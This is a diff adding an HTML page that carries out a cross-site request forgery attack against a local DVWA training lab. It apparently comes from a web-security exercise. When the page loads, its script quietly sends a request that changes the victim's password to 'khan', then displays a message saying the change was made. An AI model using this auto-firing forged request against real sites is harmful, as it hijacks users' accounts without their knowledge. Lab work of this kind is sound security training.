@@ -1,0 +1,21 @@
+<html>
+  <head>
+    <title>CSRF Attack</title>
+  </head>
+  <body onload="change_password()">
+    <h2>
+      The password has been changed using Cross-site request forgery attack
+    </h2>
+
+    <script>
+      function change_password() {
+        const request = new XMLHttpRequest();
+        const url =
+          "http://localhost/dvwa/vulnerabilities/csrf/?password_new=khan&password_conf=khan&Change=Change#";
+
+        request.open("GET", url);
+        request.send();
+      }
+    </script>
+  </body>
+</html>
